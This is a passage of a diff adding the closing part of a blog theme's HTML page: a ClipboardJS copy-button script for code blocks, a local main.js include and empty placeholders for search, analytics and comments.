+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
